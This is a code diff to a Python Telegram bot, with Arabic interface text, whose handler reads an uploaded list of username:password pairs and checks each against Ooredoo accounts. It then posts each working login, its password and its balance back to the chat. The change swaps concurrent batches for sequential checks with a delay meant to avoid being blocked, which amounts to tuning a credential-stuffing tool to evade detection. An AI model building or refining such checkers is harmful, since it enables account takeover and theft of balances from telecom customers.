@@ -224,7 +224,7 @@ async def process_ooredoo_file(update: Update, context: ContextTypes.DEFAULT_TYP
         await update.message.reply_text("❌ أرسل ملف TXT فقط.")
         return True
 
-    msg = await update.message.reply_text("⏳ جاري تحميل الملف وبدء الفحص السريع...")
+    msg = await update.message.reply_text("⏳ جاري تحميل الملف وبدء الفحص...")
     
     try:
         file_obj = await file.get_file()
@@ -243,49 +243,49 @@ async def process_ooredoo_file(update: Update, context: ContextTypes.DEFAULT_TYP
             await msg.edit_text("❌ الملف فارغ أو لا يحتوي على الصيغة الصحيحة (user:pass).")
             return True
 
-        await msg.edit_text(f"⏳ تم العثور على {total} حساب. جاري الفحص عبر API (سريع جداً)...")
+        await msg.edit_text(f"⏳ تم العثور على {total} حساب. جاري الفحص...")
 
-        results = []
-        
-        import aiohttp
+        # استيراد الكلاس الجديد الذي يعتمد على curl_cffi
         from automation.ooredoo_api import OoredooAPI
         
         checker = OoredooAPI()
-        chunk_size = 20 
         
-        async with aiohttp.ClientSession() as session:
-            for i in range(0, total, chunk_size):
-                chunk = accounts_to_check[i:i + chunk_size]
-                
-                try: 
-                    await msg.edit_text(f"⏳ جاري الفحص... {i}/{total} (يتم فحص {len(chunk)} حسابات معاً)")
-                except: 
-                    pass
-                
-                tasks = [checker.check_account(session, u, p) for u, p in chunk]
-                chunk_results = await asyncio.gather(*tasks)
-                
-                for res in chunk_results:
-                    if res["success"] or res["balance"] != "فشل الدخول":
-                        results.append(res)
-                
-                await asyncio.sleep(0.5)
-        
-        if not results:
-            await msg.edit_text("❌ لم يتم العثور على أي حساب صالح.")
-            return True
+        for index, (user, pwd) in enumerate(accounts_to_check):
+            try:
+                await msg.edit_text(f"⏳ جاري الفحص... {index + 1}/{total}")
+            except:
+                pass
             
-        res_text = "📊 *نتائج سحب Ooredoo (عبر API):*\n\n"
-        for r in results:
-            res_text += f"👤: `{r['user']}`\n🔑: `{r['pass']}`\n💰: *{r['balance']}*\n➖➖➖➖\n"
+            # ✅ تشغيل الفحص في Thread منفصل لتجنب تجميد البوت
+            result = await asyncio.to_thread(checker.check_account, user, pwd)
             
-        if len(res_text) > 4000:
-            for x in range(0, len(res_text), 4000):
-                await context.bot.send_message(chat_id=update.effective_chat.id, text=res_text[x:x+4000], parse_mode="Markdown")
-        else:
-            await context.bot.send_message(chat_id=update.effective_chat.id, text=res_text, parse_mode="Markdown")
+            # إرسال رسالة فورية لكل حساب
+            if result["success"]:
+                res_text = (
+                    f"✅ <b>حساب يعمل:</b>\n\n"
+                    f"👤 <b>المستخدم:</b> <code>{result['user']}</code>\n"
+                    f"🔑 <b>كلمة المرور:</b> <code>{result['pass']}</code>\n"
+                    f"💰 <b>الرصيد:</b> <code>{result['balance']}</code>"
+                )
+            else:
+                detail = f"\n🔍 <b>التشخيص:</b> <i>{result['error_detail']}</i>" if result['error_detail'] else ""
+                res_text = (
+                    f"❌ <b>حساب فاشل:</b>\n\n"
+                    f"👤 <b>المستخدم:</b> <code>{result['user']}</code>\n"
+                    f"🔑 <b>كلمة المرور:</b> <code>{result['pass']}</code>\n"
+                    f"⚠️ <b>السبب:</b> <code>{result['balance']}</code>{detail}"
+                )
+                
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id, 
+                text=res_text, 
+                parse_mode="HTML"
+            )
             
-        await msg.delete()
+            # تأخير بين كل حساب لتجنب الحظر
+            await asyncio.sleep(5)
+            
+        await msg.edit_text("✅ تم الانتهاء من فحص جميع الحسابات.")
         
     except Exception as e:
         log.error(f"خطأ في فحص Ooredoo: {e}")
